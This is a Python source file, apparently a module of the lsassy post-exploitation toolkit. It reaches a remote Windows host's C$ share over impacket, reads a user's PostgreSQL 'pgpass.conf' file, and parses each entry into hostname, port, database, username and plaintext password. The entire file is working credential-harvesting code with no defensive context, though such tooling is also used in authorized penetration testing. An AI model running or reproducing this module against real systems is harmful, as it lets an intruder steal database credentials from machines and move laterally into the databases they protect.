import logging
import os

from lsassy.credential import Credential

from lsassy.impacketfile import ImpacketFile

from lsassy.dpapi.config.constant import constant
from lsassy.dpapi.config.moduleinfo import ModuleInfo


class PostgreSQL(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, name='postgresql', category='databases')

    def run(self):
        pwd_found = []
        try:
            with self.impacketfile.open(
                    "C$",
                    os.path.join(constant.profile['APPDATA'], 'postgresql').replace("{user}", self.user),
                    'pgpass.conf',
                    timeout=0
            ) as handle:
                logging.info(f"Found pgpass.conf")
                logging.success(f"PostgreSQL config file exists!")
                content = handle.read(handle.size()).decode("utf-8")
        except Exception as e:
            return pwd_found

        for line in content.replace("\r", "").split("\n"):
            try:
                items = line.strip().split(':')

                pwd_found.append(Credential(
                    username=items[3],
                    password=items[4],
                    data={
                        "hostname": items[0],
                        "port": items[1],
                        "db": items[2]
                    }
                ))

            except Exception:
                pass

        return pwd_found